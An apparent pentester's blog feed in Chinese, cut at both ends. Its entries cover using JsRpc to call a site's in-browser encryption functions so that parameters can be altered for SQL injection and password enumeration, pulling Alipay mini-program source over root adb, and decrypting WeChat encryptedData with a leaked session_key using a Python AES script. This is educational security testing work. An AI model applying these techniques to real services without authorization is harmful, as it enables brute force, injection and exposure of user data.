class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;enc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(param)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071119854.png" alt="image.png"> </p><p>3、autodecoder代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/decode&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">decrypt</span>():</span><br><span class="line">    param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;dataBody&#x27;</span>)  # 获取  post 参数</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;enc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(param)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)  # 这里换get也是可以的</span><br><span class="line"></span><br><span class="line">    encry_param = json.<span class="title function_">loads</span>(res.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;param:&quot;</span>, json.<span class="title function_">dumps</span>(param))</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">200</span>)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;encry_param:&quot;</span>,encry_param)</span><br><span class="line">    <span class="keyword">return</span> encry_param</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/encode&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">encrypt</span>():</span><br><span class="line">    param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;dataBody&#x27;</span>)  # 获取  post 参数</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="property">debug</span> = <span class="title class_">True</span>  # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117344.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117365.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JsRpc </tag>
            
            <tag> 加解密 </tag>
            
            <tag> autodecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JsRpc:提升前端渗透测试效率</title>
      <link href="/2024/05/06/JsRpc-%E6%8F%90%E5%8D%87%E5%89%8D%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/"/>
      <url>/2024/05/06/JsRpc-%E6%8F%90%E5%8D%87%E5%89%8D%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Rpc概述"><a href="#Rpc概述" class="headerlink" title="Rpc概述"></a>Rpc概述</h1><h2 id="什么是RPC"><a href="#什么是RPC" class="headerlink" title="什么是RPC"></a>什么是RPC</h2><p>全称 Remote Procedure Call——远程过程调用。</p><p>在网站的控制台新建一个WebScoket客户端链接到服务器通信，调用服务器的接口 服务器会发送信息给客户端</p><p>客户端接收到要执行的方法执行完js代码后把获得想要的内容发回给服务器 服务器接收到后再显示出来</p><p><strong>在js加密中JsRPC有什么作用？</strong></p><p>比如在访问网站时，我们想直接替换参数，查看有无sql注入或者想枚举密码、挖掘逻辑漏洞替换参数。但是发现参数值是加密的。此时，阅读js代码、补环境很费时费力。上手难度较大。</p><p>这时候就可以使用JsRPC。</p><p>RPC的优点：免去扣取代码和补环境的步骤。。。</p><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>用户找到加密函数的位置【最重要】</p><p>在浏览器的console中输入env.js（包中自带的）</p><p>cmd中运行jsrpc程序</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061630850.png" alt="image-20240506163047789"> </p><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><p>下载地址</p><p><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- main.go (服务器的主代码)</span><br><span class="line">-- resouces/JsEnv_Dev.js (客户端注入js环境)</span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>运行服务器程序和js脚本 即可让它们通信，实现调用接口执行js获取想要的值(加解密)</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>原理：在网站的控制台新建一个WebScoket客户端链接到服务器通信，调用服务器的接口 服务器会发送信息给客户端 客户端接收到要执行的方法执行完js代码后把获得想要的内容发回给服务器 服务器接收到后再显示出来</p><p>【说明】本方法可以https证书且支持wss</p><p>在https的网站想要新建WebSocket连接如果是连接到普通的ws会报安全错误，连接本地(127.0.0.1)不会报错~ 可以用本地和wss 你自己看着玩</p><ol><li>无https证书者。直接编译main.go 使用本地ip(127.0.0.1)可以在https的网站直接连接ws使用 默认端口12080</li><li>有https证书者。修改main.go文件 把r.Run()注释掉，把r.RunTls注释取消掉 并且参数设置证书的路径 直接输入名字就是当前路径 默认端口：12443</li></ol><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>1、打开编译好的文件，开启服务release下载，如下图所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061642614.png" alt="image.png"> </p><p><strong>api简介</strong>：</p><ul><li>&#x2F;list：查看当前连接的ws服务（get）</li><li>&#x2F;ws：浏览器注入ws连接的端口（ws|wss）</li><li>&#x2F;wst：ws测试使用，发啥回啥（ws|wss）</li><li>&#x2F;go：获取数据的接口（get|post）</li><li>&#x2F;execjs：传递jscode给浏览器执行（get|post）</li></ul><p>说明：接口用?group和name来区分任务，如”ws:&#x2F;&#x2F;127.0.0.1:1280&#x2F;ws?group&#x3D;{}&amp;name&#x3D;{}”&#x2F;&#x2F;注入ws的例子 group和name都可以随便起名(必填) <a href="http://127.0.0.1:12080/go?group=%7B%7D&name=%7B%7D&action=%7B%7D&param=%7B%7D">http://127.0.0.1:12080/go?group={}&amp;name={}&amp;action={}&amp;param={}</a> &#x2F;&#x2F;这是调用的接口 group和name填写上面注入时候的，action是注册的方法名,param是可选的参数 接口参数暂定为这几个，但是param还可以传stringify过的json(字符串) 下面会介绍。</p><p>2、注入JS，构建通信环境（&#x2F;resource&#x2F;JsEnv.js）</p><p>打开JsEnv 复制粘贴到网站控制台(注意：可以在浏览器开启的时候就先注入环境，不然要放开调试断点才能注入)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061644138.png" alt="image.png"> </p><p>3、连接通信</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注入环境后连接通信</span><br><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br></pre></td></tr></table></figure><h2 id="I-远程调用0"><a href="#I-远程调用0" class="headerlink" title="I 远程调用0"></a>I 远程调用0</h2><p><strong>接口传入JS代码让浏览器执行</strong></p><p>浏览器已经连接上通信后 调用execjs接口就行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    console.log(&quot;test&quot;)</span></span><br><span class="line"><span class="string">    return &quot;执行成功&quot;</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jscode&quot;</span>:jscode</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061646342.png" alt="image.png"> </p><h2 id="II-远程调用：浏览器预先注册JS方法-传递函数名调用"><a href="#II-远程调用：浏览器预先注册JS方法-传递函数名调用" class="headerlink" title="II 远程调用：浏览器预先注册JS方法 传递函数名调用"></a>II 远程调用：浏览器预先注册JS方法 传递函数名调用</h2><p><strong>远程调用1：无参获取值</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 注册一个方法 第一个参数hello为方法名，</span></span><br><span class="line"><span class="comment">// 第二个参数为函数，resolve里面的值是想要的值(发送到服务器的)</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="comment">//这样每次调用就会返回“好困啊+随机整数”</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Js</span>_sjz = <span class="string">&quot;好困啊&quot;</span>+<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">1000</span>);</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="title class_">Js</span>_sjz);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 异步的代码注册：</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&#x27;token&#x27;</span>, <span class="keyword">async</span> (resolve) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> token = <span class="keyword">await</span> grecaptcha.<span class="title function_">execute</span>(<span class="number">0</span>, &#123; <span class="attr">action</span>: <span class="string">&#x27;&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">resolve</span>(token);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问接口，获得js端的返回值<br><a href="http://localhost:12080/go?group=zzz&name=hlg&action=hello">http://localhost:12080/go?group=zzz&amp;name=hlg&amp;action=hello</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061647609.png" alt="image.png"> </p><p><strong>远程调用2：带参数值获取</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写一个传入字符串，返回base64值的接口(调用内置函数btoa)</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>) &#123;</span><br><span class="line">    <span class="comment">//这样添加了一个param参数，http接口带上它，这里就能获得</span></span><br><span class="line">    <span class="keyword">var</span> base666 = <span class="title function_">btoa</span>(param)</span><br><span class="line">    <span class="title function_">resolve</span>(base666);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>访问接口，获得JS的返回值。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061707111.png" alt="image-20240506170759046"> </p><h2 id="远程调用3：带多个参获-并且使用post方式-取值"><a href="#远程调用3：带多个参获-并且使用post方式-取值" class="headerlink" title="远程调用3：带多个参获 并且使用post方式 取值"></a>远程调用3：带多个参获 并且使用post方式 取值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//假设有一个函数 需要传递两个参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hlg</span>(<span class="params">User,Status</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">User</span>+<span class="string">&quot;说：&quot;</span>+<span class="title class_">Status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello3&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>) &#123;</span><br><span class="line">    <span class="comment">//这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span></span><br><span class="line">    res=<span class="title function_">hlg</span>(param[<span class="string">&quot;user&quot;</span>],param[<span class="string">&quot;status&quot;</span>])</span><br><span class="line">    <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>访问接口，获得js端的返回值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hello3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;param&quot;</span>: json.dumps(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;黑脸怪&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;好困啊&quot;</span>&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;param&quot;</span>]) <span class="comment">#dumps后就是长这样的字符串&#123;&quot;user&quot;: &quot;\u9ed1\u8138\u602a&quot;, &quot;status&quot;: &quot;\u597d\u56f0\u554a&quot;&#125;</span></span><br><span class="line">res=requests.post(url, data=data) <span class="comment">#这里换get也是可以的</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061710235.png" alt="image-20240506171012173"> </p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JsRpc </tag>
            
            <tag> 加解密 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>支付宝小程序反编译流程</title>
      <link href="/2024/05/04/%E6%94%AF%E4%BB%98%E5%AE%9D%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/05/04/%E6%94%AF%E4%BB%98%E5%AE%9D%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在平常测试微信小程序的时候，会对微信小程序进行一下反编译，看看里面有没有泄露敏感信息，如小程序的key、secret、敏感接口，硬编码等。针对一些金融类的小程序，可能还要对其反编译后获取源码，定位加解密算法，配着脚本实现渗透测试。这块相关的知识，网上有比较多的案例，就不细说了。</p><p>前段时间某运营商，提出针对支付宝中小程序的渗透测试，就在想能不能把支付宝中小程序像微信一样反编译，看看有没有敏感信息泄露。网上找了一圈，关于支付宝小程序反编译案例较少，参考了网上一些教程，简单记录一下支付宝小程序反编译的过程。。。</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><ul><li>已经root过的手机（这块模拟器也行-模拟器默认支持支付宝）</li><li>安卓adb（安装官网下载最新版本的 Platform Tools-包含 ADB）</li></ul><h1 id="定位源码包位置"><a href="#定位源码包位置" class="headerlink" title="定位源码包位置"></a>定位源码包位置</h1><p>1、连上手机以后Windows进入adb shell然后su切换为管理员权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell &amp;&amp; su</span><br></pre></td></tr></table></figure><p>2、然后直接进入支付宝小程序存放目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data/data/com.eg.android.AlipayGphone/files/nebulaInstallApps/</span><br></pre></td></tr></table></figure><p>然后，就可以看到该目录下，对应的小程序列表</p><p>可以按照时间排序，查看最新打开的支付宝小程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503090.png" alt="image.png"> </p><p>排在最上面的就是最近打开的小程序，从上往下按时间降序，一般都是图中一长串数字的.</p><p>【*】6开头短数字的目录我看的是支付宝加载的服务包。</p><p>3、然后随便进入一个小程序目录查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd 6d478a9eea58c23d3de0a047a9534d70</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503700.png" alt="img"> </p><p>这个tar文件就是小程序的源码包，然后让这个文件复制到sdcard目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp 2021004100610928.tar /sdcard/</span><br></pre></td></tr></table></figure><p>然后直接adb pull将源码包导出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/2021004100610928.tar</span><br></pre></td></tr></table></figure><p>导出后直接解压文件就可以查看源码了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503317.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061505475.png" alt="image.png">  </p><p>最终导出来之后效果图如下</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503347.png" alt="img"> </p><p>3、小程序源码使用的是js，而通常会加密、混淆等，如上图的js文件，对于我们分析会有一定的阻碍。</p><p>方法还是有的，只需要对js进行美化即可帮助我们分析，这里推荐一个js美化在线工具：</p><p><a href="https://tool.lu/js/">https://tool.lu/js/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061504971.png" alt="image.png">  </p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>支付宝下程序源码包获取还是比较简单的。不需要像微信小程序那样解密，反编译之类的。</p><p>tar压缩文件即为小程序的源码包。这个包没有加密，使用adb pull拿出来，直接解压即可。解压后对js格式化下代码，就可以分析了。js代码没有混淆，条理很清晰</p><h1 id="备注-支付宝小程序抓包"><a href="#备注-支付宝小程序抓包" class="headerlink" title="[备注]支付宝小程序抓包"></a>[备注]<strong>支付宝小程序抓包</strong></h1><p>在查找小程序反编译的时候，看到52pojie一篇关于小程序抓包的文章，可以参考下！</p><p><a href="https://www.52pojie.cn/thread-1050690-1-1.html">https://www.52pojie.cn/thread-1050690-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 支付宝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序sessionkey泄露漏洞利用</title>
      <link href="/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8Fsessionkey%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8Fsessionkey%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="案例介绍"><a href="#案例介绍" class="headerlink" title="案例介绍"></a>案例介绍</h1><p>闲来无事，在测试某小程序的时候，发现存在sessionkey泄露漏洞。具体流程如下：</p><p>1、打开小程序后，点击【用户一键登录】：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061407311.png" alt="image.png"> </p><p>2、burp抓包，发现在请求参数中携带了几个比较敏感的字段，如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061407019.png" alt="image.png"> </p><p>三个敏感参数</p><ul><li>encryptedData</li><li>iv</li><li>session_key</li></ul><p>3、参考上篇文章，微信小程序登录流程。知道session_key的作用之一是将小程序前端从微信服务器获取到的encryptedData 解密出来。</p><h1 id="服务端获取开放数据"><a href="#服务端获取开放数据" class="headerlink" title="服务端获取开放数据"></a>服务端获取开放数据</h1><p>微信会对开放数据做签名和加密处理。开发者后台拿到开放数据后可以对数据进行校验签名和解密，来保证数据不被篡改。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061416344.png" alt="image-20240506141657312"> </p><p>签名校验以及数据加解密涉及用户的会话密钥 session_key。 开发者应该事先通过 <a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/login/wx.login.html">wx.login</a> 登录流程获取会话密钥 session_key 并保存在服务器。为了数据不被篡改，开发者不应该把 session_key 传到小程序客户端等服务器外的环境。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061417692.png" alt="image.png"> </p><h1 id="加密数据解密算法"><a href="#加密数据解密算法" class="headerlink" title="加密数据解密算法"></a>加密数据解密算法</h1><p>接口如果涉及敏感数据（如<a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/user-info/wx.getUserInfo.html">wx.getUserInfo</a>当中的 openId 和 unionId），接口的明文内容将不包含这些敏感数据。开发者如需要获取敏感数据，需要对接口返回的加密数据(encryptedData) 进行对称解密。 解密算法如下：</p><ol><li>对称解密使用的算法为 AES-128-CBC，数据采用PKCS#7填充。</li><li>对称解密的目标密文为 Base64_Decode(encryptedData)。</li><li>对称解密秘钥 aeskey &#x3D; Base64_Decode(session_key), aeskey 是16字节。</li><li>对称解密算法初始向量 为Base64_Decode(iv)，其中iv由数据接口返回。</li></ol><p>微信官方提供了多种编程语言的示例代码（<a href="https://res.wx.qq.com/wxdoc/dist/assets/media/aes-sample.eae1f364.zip">点击下载</a>）。每种语言类型的接口名字均一致。</p><h1 id="Python本地实现"><a href="#Python本地实现" class="headerlink" title="Python本地实现"></a>Python本地实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-04-26 15:42</span></span><br><span class="line"><span class="comment"># @Author: muhe Jing</span></span><br><span class="line"><span class="comment"># @File: decrypt.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key, i_v</span>):</span><br><span class="line">    data = base64.b64decode(urllib.parse.unquote(data))</span><br><span class="line">    key = base64.b64decode(urllib.parse.unquote(key))</span><br><span class="line">    i_v = base64.b64decode(urllib.parse.unquote(i_v))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="built_in">print</span>(i_v)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, i_v)</span><br><span class="line">    decrypted = cipher.decrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(decrypted.decode)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encryptedData = <span class="built_in">input</span>(<span class="string">&quot;输入获取到的encryptedData:&quot;</span>)</span><br><span class="line">    session_key = <span class="built_in">input</span>(<span class="string">&quot;输入获取到的session_key:&quot;</span>)</span><br><span class="line">    iv = <span class="built_in">input</span>(<span class="string">&quot;输入获取到的iv:&quot;</span>)</span><br><span class="line">    decrypt(encryptedData, session_key, iv)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061418857.png" alt="img"> </p><p>这块可以看到解密之后，在明文字符串后面有特殊字符 “\0e”</p><p>这主要是因为AES算法填充使用的是PKCS#7，该填充模式的特性如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061423475.png" alt="image-20240506142355445"> </p><p>所以，这块填充个了 14字节的 “\x0e”。。。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 微信小程序 </tag>
            
            <tag> sessionkey泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序授权&amp;登录&amp;sessionkey&amp;unionid介绍</title>
      <link href="/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%88%E6%9D%83-%E7%99%BB%E5%BD%95-sessionkey-unionid%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%88%E6%9D%83-%E7%99%BB%E5%BD%95-sessionkey-unionid%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微信小程序相比于普通的应用，很大的一个优势在于不需要进行注册和显式登录，大部分问题可以直接一键微信登录解决。<br>但是，在点击 “授权”、”登录” 的过程中，都做了那些事情呢？</p><p>1、<strong>获取用户登录凭证</strong>：小程序首先会调用微信提供的<code>wx.login</code>接口，获取用户的登录凭证（code）。这个code是一个临时的、有时效性的字符串，用于后续的身份验证。</p><p>2、<strong>发送请求到开发者服务器</strong>：小程序将获取到的code发送到开发者自己的服务器。这一步是为了保护用户的隐私和安全，因为用户的微信敏感信息（如openid、session_key等）不会直接暴露给小程序。</p><p>3、<strong>开发者服务器与微信服务器交互</strong>：开发者服务器将code、小程序的AppID和AppSecret（这是开发者在微信公众平台注册小程序时获得的，用于证明开发者身份的密钥）一起发送给微信服务器进行校验。</p><p>4、<strong>微信服务器返回用户信息</strong>：如果校验通过，微信服务器会返回一个openid和一个session_key给开发者服务器。openid是用户在微信中的唯一标识，session_key是本次会话的密钥，用于后续加密用户数据的解密。</p><p>5、<strong>开发者服务器返回用户信息给小程序</strong>：开发者服务器可以将openid返回给小程序。小程序可以根据openid进行用户的唯一标识和业务处理。如果需要获取更多用户信息，如昵称、头像等，小程序还需要用户进行额外的授权操作。</p><p>6、<strong>用户授权操作</strong>：如果用户需要授权小程序获取更多的个人信息，小程序会展示一个授权界面，用户点击“授权”按钮后，小程序就可以获取到用户的基本信息了。</p><p>这些就是在微信小程序中点击“授权”或“登录”的过程中，主要发生的一系列操作。这样的设计既保证了用户信息的安全性，又简化了用户的登录流程，提高了用户体验。</p><p>下面通过四个方面主要说一下具体的细节：</p><ul><li>授权和登录的意义</li><li>sessionkey的作用</li><li>unionid的作用，有哪些获取途径</li><li>在应用中如何保存用户登录态</li></ul><h1 